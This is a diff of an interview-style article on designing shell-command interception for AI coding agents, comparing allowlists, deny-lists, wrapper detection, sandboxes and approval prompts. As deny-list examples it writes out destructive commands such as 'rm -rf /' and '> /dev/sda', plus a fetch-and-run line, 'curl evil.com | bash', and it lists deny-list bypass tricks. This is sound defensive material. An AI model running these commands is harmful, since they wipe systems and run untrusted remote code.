-- **Real boundary** = sandbox + permission prompt. **Purpose**: even if the model gets fooled, the host filesystem stays intact. **Premise**: every argv is untrusted. **Promises**: the damage from a passing command stays inside the sandbox.
+- **Potential boundary** = sandbox + permission prompt. Protection is only as strong as the sandbox profile, mounts, sockets, capabilities, network, and runtime configuration; every argv remains untrusted.
 
 This distinction matters enormously for agent systems, which are full of "user UX" toggles: skip approval, cache permissions, allowlist a tool. **Every toggle must be labeled** either convenience or boundary.
 
@@ -623,7 +606,7 @@ Conflating them turns into "I thought that was a boundary" when an incident hits
 Practical steps:
 
 1. In settings.json, mark every convenience-only toggle with `_comment: "convenience, not a security boundary"`.
-2. Document a dedicated "What is a real security boundary in this system?" page; only two items in Claude Code's case.
+2. Document which controls may form a boundary and list their assumptions: sandbox profile, permission mode, mounts, network, and exception settings.
 3. In source, annotate every soft-looking check with its boundary level.
 
 **Source**: `claude-code/src/tools/BashTool/shouldUseSandbox.ts:130-153` plus the file's opening comment.
@@ -661,7 +644,7 @@ There's also an implicit fourth value: **no rule matched = default Prompt**. The
 <details>
 <summary>**Q5 · Concept**: Hermes validates workdir with an allowlist regex `^[A-Za-z0-9/\\:_\-.~ +@=,]+$`. Why allowlist instead of deny-list?</summary>
 
-The source comment: "deny-lists always lose to novel metacharacters."
+The Hermes source comment uses absolute wording to argue that a deny-list can miss novel metacharacters. That is the source author's judgement, not a general law adopted by this article. The supportable risk is narrower: a deny-list covers known patterns, so rule updates can lag new shell syntax, encodings, or combinations.
 
 Concrete scenario: add `$`, `;`, `&&`, backticks, `|` to the deny list (cmd substitution, separator, chain, backticks, pipe). Looks complete? Attacker uses:
 
@@ -673,11 +656,11 @@ Concrete scenario: add `$`, `;`, `&&`, backticks, `|` to the deny list (cmd subs
 - Here-docs `<<EOF`
 - Comments `#` to truncate
 
-Every new bypass adds a deny entry. Always trailing the attack surface.
+Each newly observed bypass may require another deny rule. Without a representative corpus and an update process, coverage can lag new syntax or combinations; that is a maintenance risk, not an inevitable outcome for every system.
 
 Allowlist flips it: "only `[A-Za-z0-9/\\:_\-.~ +@=,]` may appear." A **character whitelist** by construction excludes novel vectors.
 
-Trade-off: legitimate workdirs with `(` or emoji get rejected, but 99% of paths look like `/home/user/projects/foo` or `C:\Users\...\foo`, so coverage is enough.
+Trade-off: legitimate workdirs with `(` or emoji get rejected. `/home/user/projects/foo` and `C:\Users\...\foo` are common examples, not evidence that the allowlist covers your paths.
 
 Engineering philosophy: **default deny + explicit allow**. Apply across the shell-safety stack:
 
@@ -686,7 +669,7 @@ Engineering philosophy: **default deny + explicit allow**. Apply across the shel
 3. Default deny all characters; allowlist regex permits some.
 4. Default sandbox; only `excludedCommands` skips.
 
-Every layer defaults to deny. Even if one layer drops a metacharacter, the next layer catches. **Defense in depth.**
+Multiple deny layers can provide defense in depth when they are enabled and independently tested. A character allowlist or sandbox default does not prove that a later layer will catch every missed case.
 
 **Source**: `hermes/tools/terminal_tool.py:150-177` (the regex + the allowlist-vs-deny-list comment).
 
@@ -696,47 +679,46 @@ Every layer defaults to deny. Even if one layer drops a metacharacter, the next 
 <details>
 <summary>**Q6 · Practical**: You're adding shell interception to an existing agent. What's the first step?</summary>
 
-**Always start with allowlist.** Not a DSL, not tree-sitter, not a sandbox.
+**Start by choosing the execution interface.** Prefer argv plus `shell=False` where possible. If you must accept shell text, log it and route complex syntax to approval before adding heavier parsing or a sandbox.
 
-**Day 1**: write `safe-cmd.txt` with read-only basics: `ls`, `cat`, `head`, `tail`, `pwd`, `grep`, `find`, `git status`, `git diff`, `git log`. Shlex-tokenize before tool exec; pass if head is in the file, otherwise approval.
+**Stage 1**: represent a small set of read-only programs as argv rules, and enforce path containment separately. Use shlex only for diagnostics; a first-token match is not an execution boundary for shell text.
 
 ```python
 import shlex
 
 ALLOWLIST = set(open("safe-cmd.txt").read().split())
 
-def check(cmd: str) -> tuple[str, str]:
-    try:
-        tokens = shlex.split(cmd)
-    except ValueError as e:
-        return "prompt", f"unparseable shell: {e}"
-    if not tokens:
+def check(argv: list[str]) -> tuple[str, str]:
+    """Return a policy decision; execute with shell=False after path checks."""
+    if not argv:
         return "prompt", "empty command"
-    if tokens[0] in ALLOWLIST:
+    if argv[0] in {"sh", "bash", "zsh", "cmd.exe", "eval"}:
+        return "prompt", "shell wrapper requires review"
+    if argv[0] in ALLOWLIST:
         return "allow", ""
-    return "prompt", f"first token '{tokens[0]}' not in allowlist"
+    return "prompt", f"program '{argv[0]}' is not in the allowlist"
 ```
 
-**Day 2**: add wrapper detection. Before the allowlist check, look for `sh -c` / `bash -c` / `zsh -c` / `eval`. If wrapped, extract the inner command and re-check. This is the #1 allowlist bypass.
+**Stage 2**: identify `sh -c`, `bash -c`, `zsh -c`, `eval`, and similar wrappers. Without a proven nested parser, send them to approval instead of guessing at the inner command.
 
-**Day 3**: add workdir validation. Borrow Hermes's char allowlist.
+**Stage 3**: validate workdir characters, realpath containment, symlinks, and mounts; a character allowlist covers only one part of that boundary.
 
-**Day 4**: add hard-deny list. Commands so dangerous that approval is also wrong: `rm -rf /`, `dd if=`, `mkfs.`, `> /dev/sda`. This maps to Codex's `Forbidden`.
+**Stage 4**: add a hard-deny list suited to the threat model, then measure false positives and misses against labelled command samples. This maps to Codex's `Forbidden` state.
 
-**Day 5**: build the prompt interface. CLI uses `inquirer.confirm`, IDE uses vscode API, gateway uses IM callbacks.
+**Stage 5**: connect the prompt to the actual entry point and record pending, approved, denied, and timed-out states.
 
-**Week 2 onward**:
+**Later**:
 
 - DSL extraction (Codex style): rules + self-tests.
 - tree-sitter (Claude Code style): per-command AST parsing.
 - Safe-bin profiles (OpenClaw style).
 - Sandboxes (all four): bubblewrap / sandbox-exec / docker.
 
-Why no heavy weapons day 1?
+Why defer heavier controls to the first iteration?
 
-1. **You don't know what the user actually runs.** A week of allowlist + universal prompt reveals the real distribution; then decide what graduates to allowlist.
+1. **You don't know what the user actually runs.** Start with allowlist plus prompts for a representative traffic window, then decide which commands graduate.
 2. **Approval is the bottleneck.** Get the prompt channel working first or there's nowhere for unfiltered traffic to go.
-3. **Most agents don't need a DSL.** Unless you maintain 100+ rules for diffing, an if/else block is enough.
+3. **A DSL is a maintenance decision.** Start with a testable small policy, then extract it when rule count, review frequency, or team ownership makes the boundary worthwhile.
 
 **Source ladder**: simplest to fanciest: Hermes `terminal_tool.py:150-200` → Codex `execpolicy/src/policy.rs:34-260` → Claude Code `BashTool/bashSecurity.ts:1-300`.
 
@@ -791,7 +773,7 @@ The 7 backends are `local / docker / modal / ssh / singularity / daytona / manag
 2. **Per-backend spawn protocols differ.** local is `subprocess.Popen`; docker is `client.containers.run`; modal is `Image.from_dockerfile + sb.exec`; ssh is `client.exec_command`. Unifying the interface forces re-implementing spawn, log streaming, and cleanup per backend.
 3. **Per-backend error shapes differ.** local raises `OSError`, docker raises `docker.errors.APIError`, modal raises `modal.exception.Error`. The wrapper has to normalize all of these.
 4. **Per-backend lifecycle differs.** local processes die with the agent; docker containers need `--rm`; modal sandboxes have idle timeouts; ssh sessions stay open. There are 200+ lines just for lifecycle in `terminal_tool.py`.
-5. **Cold-start latency differs.** local: ms. docker: seconds. modal: minutes (first image build). Users have to re-learn timing intuition per backend.
+5. **Cold-start latency differs.** Local, Docker, and remote sandboxes have different startup paths; image pulls, network, and credential setup can dominate the first run. Measure the target image and region before choosing synchronous or background execution.
 
 Why don't others do it?
 
@@ -799,9 +781,9 @@ Why don't others do it?
 - **Claude Code** targets IDE plugins; it runs on the user's box, sandbox-exec / bubblewrap suffices. Containers aren't its job.
 - **OpenClaw** is a platform; it abstracts execution into `ExecHost: sandbox / gateway / node` and lets users plug in implementations.
 
-Why Hermes does it? **Hermes is Nous Research's research platform.** They test the same agent across environments ("how does behavior change on modal cloud sandbox?"). The backend switch is research-driven tech debt.
+Why does Hermes expose it? **The source shows a switchable execution backend** that can select local or isolated execution. Whether the design came from cross-environment research or another deployment requirement needs project documentation or maintainer evidence; this article does not label it "tech debt."
 
-Practical lesson: **unless you're a research platform, don't borrow from Hermes here.** 99% of agents need local + one container backend (docker or firecracker). The debt of multi-backend is way larger than the benefit.
+Practical lesson: without a concrete cross-environment experiment or tenant-isolation requirement, start with local execution plus one isolated backend. Multiple backends add dependency, lifecycle, and error-normalisation costs; deployment needs should justify them.
 
 **Source**: `hermes/tools/terminal_tool.py:1-250` (the `_get_terminal_runner` dispatch table).
 
@@ -813,15 +795,15 @@ Practical lesson: **unless you're a research platform, don't borrow from Hermes 
 
 Defense in depth, four stages. Each stage must prove out before the next.
 
-**Stage 1 (1-2 weeks) · Visibility first**
+**Stage 1 · Visibility first**
 
 No interception yet. Just logs. Every shell command lands in audit logs: timestamp, model turn, raw argv, cwd, user/role, exit code, stdout/stderr sizes. Purpose: **understand reality**. What commands actually run? Which errors recur?
 
 Which commands does the user themselves not want?
 
-Deliverable: a top-100 command distribution report from the last 7 days.
+Deliverable: a command-distribution report over a time window large enough for the workload.
 
-**Stage 2 (2-3 weeks) · Allowlist + prompt**
+**Stage 2 · Allowlist + prompt**
 
 Based on Stage 1, allowlist the safe high-frequency commands: `ls`, `cat`, `head`, `tail`, `pwd`, `grep`, `find`, `git status`, `git diff`, `git log`, `node`, `npm test`. Everything else hits prompt. Use a CLI confirm prompt to start;
 
@@ -829,39 +811,39 @@ IDE/IM channels come later.
 
 Expectation: users will complain about prompt fatigue. **That's correct feedback.** Collect complaints, decide which commands to graduate.
 
-**Stage 3 (2-3 weeks) · Hard deny for dangerous commands**
+**Stage 3 · Hard deny for dangerous commands**
 
 From Stage 1 logs, pick "commands that showed up but should not have": `rm -rf /`, `chmod -R 777 /`, `> /dev/sda`, `curl evil.com | bash`. Build `deny.txt`; these never prompt, just fail. This is Codex's `Forbidden`.
 
 Add wrapper detection: `sh -c`, `bash -c`, `eval`, `curl ... | bash`.
 
-Expectation: blocks 99% of incidents. The remaining 1% is 0-day or obfuscation.
+Expectation: measure the block rate against a labeled command corpus; do not turn a deny-list into a coverage promise.
 
-**Stage 4 (4-6 weeks) · Sandbox**
+**Stage 4 · Sandbox**
 
 By now users have clear expectations. Time for sandbox. Linux: bubblewrap. macOS: sandbox-exec. Windows: AppContainer. Whole agent process inside it.
 
-Expectation: UX dips (some commands fail with sandbox perms errors), but incident rate goes near zero.
+Expectation: UX may dip when sandbox permissions reject a command; record incidents and false positives before making a stronger claim.
 
 **Discipline**:
 
 1. **Every stage has metrics**: prompt rate (prompts / commands), deny rate, incident count. All three together.
 2. **Don't skip stages.** Sandbox-first means users `dangerouslyDisableSandbox` to get work done.
-3. **Allowlist and denylist coexist**: allowlist (always allow) + denylist (always deny) + prompt (everything else). Three states beat a boolean 10×.
+3. **Allowlist and denylist coexist**: allowlist (allow on a rule hit) + denylist (reject on a rule hit) + prompt (the middle state). Three states express more policy than a boolean; audit logs still determine whether the split works.
 
-Similar trajectory: Anthropic's Claude Code itself evolved this way; early versions had only sandbox-exec, then `bashPermissionRule`, then 23 checks, finally GrowthBook remote config. Six months end to end.
+Changelogs can show an implementation direction, but they do not establish a general delivery schedule.
 
 **Sources**: see the changelogs / git logs of all four systems.
 
-**Follow-up**: "Users refuse prompts entirely; what then?" Give a "trusted mode" toggle, but log it as `trusted_mode=true` and have the user sign it. The flag becomes the audit trail at incident time; convenience preserved, responsibility shifted.
+**Follow-up**: "Users refuse prompts entirely; what then?" Offer an explicitly documented mode with narrower scope, expiry, and audit logging. Treat it as a changed threat model, not as a signature that makes risky execution safe.
 </details>
 
 <details>
-<summary>**Q10 · Open-ended**: Design a "standard protocol for shell interception" pulling the best of each system.</summary>
+<summary>**Q10 · Open-ended**: What would a site-proposed shell interception protocol look like?</summary>
 
-A layered protocol with clear interfaces and defaults at every layer:
+This is a design sketch, not an existing protocol or shared default across the four systems:
 
-**Layer 1 · Parse (required)**
+**Layer 1 · Parse (baseline)**
 
 ```typescript
 interface ParseResult {
@@ -872,7 +854,7 @@ interface ParseResult {
 }
 ```
 
-Start with Codex's shlex + OpenClaw's wrapper recursion + obfuscation signals. tree-sitter (Claude Code) is optional for stage 2.
+Tokenise argv as an entry point, but do not treat it as shell-semantic parsing. For `sh -c`, `bash -c`, `eval`, and similar wrappers, route to approval unless a nested parser has been tested against representative commands. Wrapper parsing in the pinned Codex path is weaker and disabled by default.
 
 **Layer 2 · Policy DSL (recommended)**
 
@@ -903,7 +885,7 @@ interface SafeBinProfile {
 
 Borrow OpenClaw safe-bin. Only write profiles for binaries that really need fine-grained control (git / docker / kubectl). ls / cat don't need one.
 
-**Layer 4 · Approval channel (required)**
+**Layer 4 · Approval channel (when human review is in scope)**
 
 ```typescript
 interface ApprovalRequest {
@@ -920,7 +902,7 @@ interface ApprovalChannel {
 
 Hermes callback + OpenClaw JSONL socket. CLI / IDE / IM each get an implementation.
 
-**Layer 5 · Execution backend (required)**
+**Layer 5 · Execution backend (when the threat model requires it)**
 
 ```typescript
 interface ExecBackend {
@@ -932,7 +914,7 @@ interface ExecBackend {
 
 Borrow Hermes's multi-backend idea but trim to 3 (local + sandbox + container). Modal / daytona stay as user extensions.
 
-**Layer 6 · Audit (required)**
+**Layer 6 · Audit (when operations or compliance require it)**
 
 ```typescript
 interface AuditEvent {
@@ -972,14 +954,9 @@ const result = await shellGuard.run('git push --force');
 - ID-tagged audit; PII safe.
 - Rules diff via git.
 
-**Vs. four systems**:
+**Relationship to the four snapshots**: the sketch combines external rules, AST or wrapper handling, per-binary profiles, execution isolation, and audit interfaces. Each layer needs its own threat model and cross-platform corpus; the component list does not establish security strength.
 
-- Codex + obfuscation detection + safe-bin.
-- Claude Code without hard-coding rules into source.
-- OpenClaw + recursive wrapper handling.
-- Hermes + fine-grained command-layer interception.
-
-Effort: 3-4 person-months + 1 month docs/tests. Cheaper than rewriting any of the four.
+Estimate work from supported shells and platforms, parser coverage, policy size, isolation backends, approval channels, audit retention, and adversarial tests. A fixed person-month estimate has no useful basis before that scope exists.
 
 **Sources**: composite of the four implementations in this chapter.
 
